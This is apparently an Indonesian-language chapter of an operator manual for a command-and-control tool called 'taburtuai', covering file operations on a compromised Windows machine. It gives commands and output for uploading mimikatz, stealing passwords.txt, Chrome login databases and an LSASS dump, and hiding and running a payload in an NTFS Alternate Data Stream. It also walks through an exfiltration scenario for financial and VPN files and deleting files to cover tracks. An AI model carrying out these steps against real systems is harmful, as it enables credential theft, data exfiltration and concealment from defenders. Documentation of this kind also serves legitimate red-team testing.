# 06 — File Operations

## Upload File ke Target

Kirim file dari mesin operator ke target melalui C2 channel yang terenkripsi.
File di-base64 encode dan disertakan dalam payload perintah.

### Syntax

```
files upload <agent-id> <local-path> <remote-path>
```

### Upload Tooling ke Target

```
taburtuai(IP:8000) › files upload 2703886d /opt/tools/mimikatz.exe "C:\Temp\mimikatz.exe" --wait
```

**Output:**
```
[*] Uploading /opt/tools/mimikatz.exe (1,245,184 bytes)...
[*] Encoding payload...
[+] Upload queued: f3a41b92-...
[*] Waiting for result...
[+] File uploaded successfully (2.3s)

    Remote path: C:\Temp\mimikatz.exe
    Size       : 1,245,184 bytes
    Hash (SHA256): a3b4c5d6e7f8...
```

### Upload Script PowerShell

```
taburtuai(IP:8000) › files upload 2703886d ./enum_ad.ps1 "C:\Users\Public\enum.ps1" --wait
```

**Output:**
```
[+] File uploaded successfully (0.4s)

    Remote path: C:\Users\Public\enum.ps1
    Size       : 8,421 bytes
```

### Upload ke Path dengan Spasi

```
taburtuai(IP:8000) › files upload 2703886d ./tool.exe "C:\Users\john doe\AppData\Local\Temp\tool.exe" --wait
```

---

## Download File dari Target

Ambil file dari target ke mesin operator.

### Syntax

```
files download <agent-id> <remote-path> <local-path>
```

### Download Dokumen Sensitif

```
taburtuai(IP:8000) › files download 2703886d "C:\Users\john.doe\Documents\passwords.txt" ./loot/passwords.txt --wait
```

**Output:**
```
[*] Requesting file download: C:\Users\john.doe\Documents\passwords.txt
[+] Download queued: g4b52c03-...
[*] Waiting for result...
[+] File downloaded successfully (1.1s)

    Remote path : C:\Users\john.doe\Documents\passwords.txt
    Local path  : ./loot/passwords.txt
    Size        : 2,847 bytes
    Hash (SHA256): d8e9f0a1b2c3...
```

Isi file tersimpan di `./loot/passwords.txt` di mesin operator.

### Download Database Browser (untuk Credential Extract)

```
taburtuai(IP:8000) › files download 2703886d \
  "C:\Users\john.doe\AppData\Local\Google\Chrome\User Data\Default\Login Data" \
  ./loot/chrome_login_data --wait
```

**Output:**
```
[+] File downloaded successfully (0.8s)

    Size: 32,768 bytes (SQLite database)
```

### Download File Besar

```
taburtuai(IP:8000) › files download 2703886d "C:\Temp\lsass.dmp" ./loot/lsass.dmp \
  --timeout 120 \
  --wait
```

**Output:**
```
[+] File downloaded successfully (18.4s)

    Remote path: C:\Temp\lsass.dmp
    Local path : ./loot/lsass.dmp
    Size       : 47,185,920 bytes (44.9 MB)
```

> **Catatan:** File besar (>100MB) diblokir oleh server untuk mencegah memory exhaustion.
> Untuk file sangat besar, split dulu di target atau download langsung via SMB/HTTP.

---

## List Direktori

Lihat isi direktori di target.

### Syntax

```
files list <agent-id> <remote-path>
```

### List Desktop

```
taburtuai(IP:8000) › files list 2703886d "C:\Users\john.doe\Desktop"
```

**Output:**
```
[+] Directory listing: C:\Users\john.doe\Desktop

MODE          MODIFIED              SIZE       NAME
----------    -------------------   ---------  --------------------------------
d------       2026-04-23 07:30:00              AppData
-a----        2026-04-20 14:12:00      45,230  Q1_Financial_Report.xlsx
-a----        2026-04-22 18:45:00       2,847  passwords.txt
-a----        2026-04-21 11:00:00       1,234  VPN_Config.ovpn
-a----        2026-04-18 09:15:00     128,000  Project_Roadmap.pptx
--s---        2026-01-15 08:00:00         282  desktop.ini

[i] 5 items (4 files, 1 hidden/system)
```

### List Drive Root

```
taburtuai(IP:8000) › files list 2703886d "C:\"
```

**Output:**
```
[+] Directory listing: C:\

MODE          MODIFIED              SIZE       NAME
----------    -------------------   ---------  --------------------------------
d------       2025-03-15 09:00:00              PerfLogs
d-r---        2026-04-23 08:45:00              Program Files
d-r---        2026-04-23 08:45:00              Program Files (x86)
d------       2026-04-20 14:00:00              Temp
d-r---        2026-04-23 08:44:00              Users
d-----        2026-04-23 09:05:00              Windows
```

---

## Delete File

Hapus file di target.

```
taburtuai(IP:8000) › files delete 2703886d "C:\Temp\mimikatz.exe" --wait
```

**Output:**
```
[*] Deleting C:\Temp\mimikatz.exe...
[+] File deleted successfully.
```

```
taburtuai(IP:8000) › files delete 2703886d "C:\Temp\lsass.dmp" --wait
```

**Output:**
```
[+] File deleted successfully.
```

---

## Alternate Data Stream (ADS) Exec

Tulis dan eksekusi payload tersembunyi di Alternate Data Stream (hidden stream di NTFS).
File terlihat berukuran normal di Explorer — payload disimpan di stream tersembunyi.

### Cara Kerja ADS

```
C:\legit.txt                    ← file normal, ukuran terlihat biasa
C:\legit.txt:payload.js         ← stream tersembunyi, tidak terlihat di Explorer
```

### Write Payload ke ADS

```
taburtuai(IP:8000) › files upload 2703886d ./payload.js "C:\legit.txt:payload.js" --wait
```

**Output:**
```
[+] ADS stream written: C:\legit.txt:payload.js (4,096 bytes)
[i] Stream hidden from Explorer and dir. Use: dir /r C:\ untuk melihatnya.
```

### Eksekusi dari ADS

```
taburtuai(IP:8000) › ads exec 2703886d --ads-path "C:\legit.txt:payload.js" --wait
```

**Output:**
```
[*] Executing ADS: wscript.exe C:\legit.txt:payload.js
[+] ADS exec queued: h5c63d14-...
[+] Execution completed.
```

---

## Skenario Kerja: Exfiltration

```
# 1. List semua dokumen Word/Excel di target
taburtuai(IP:8000) › cmd 2703886d \
  "Get-ChildItem C:\Users -Recurse -Include *.xlsx,*.docx,*.pdf -ErrorAction SilentlyContinue | Select FullName,Length" \
  --method powershell \
  --timeout 60 \
  --wait
```

```
[+] Result (12.3s):

FullName                                                     Length
--------                                                     ------
C:\Users\john.doe\Documents\Q1_Financial_Report.xlsx         45230
C:\Users\john.doe\Desktop\passwords.txt                       2847
C:\Users\john.doe\Desktop\VPN_Config.ovpn                     1234
```

```
# 2. Download file-file tersebut
taburtuai(IP:8000) › files download 2703886d \
  "C:\Users\john.doe\Documents\Q1_Financial_Report.xlsx" \
  ./loot/Q1_Financial_Report.xlsx --wait

taburtuai(IP:8000) › files download 2703886d \
  "C:\Users\john.doe\Desktop\VPN_Config.ovpn" \
  ./loot/VPN_Config.ovpn --wait

# 3. Hapus jejak (jika diperlukan)
taburtuai(IP:8000) › files delete 2703886d "C:\Temp\*" --wait
```

---

## Batas & Limitasi

| Limitasi | Nilai | Keterangan |
|----------|-------|------------|
| Max upload size | 50 MB | Per file, dikodekan base64 (overhead +33%) |
| Max download size | 100 MB | Per file, server-side limit |
| Path length max | 260 karakter | Sesuai Windows MAX_PATH |
| Karakter path | ASCII + space | Unicode path belum tested |

> **Tip:** Untuk file besar (>50MB), gunakan teknik split:
> ```
> cmd 2703886d "cmd /c split -b 30m bigfile.zip bigfile.part" --method cmd
> files download 2703886d "bigfile.part.aa" ./bigfile.part.aa
> # Gabungkan di operator: cat bigfile.part.* > bigfile.zip
> ```

---

**Selanjutnya:** [07 — Persistence](07-persistence.md)
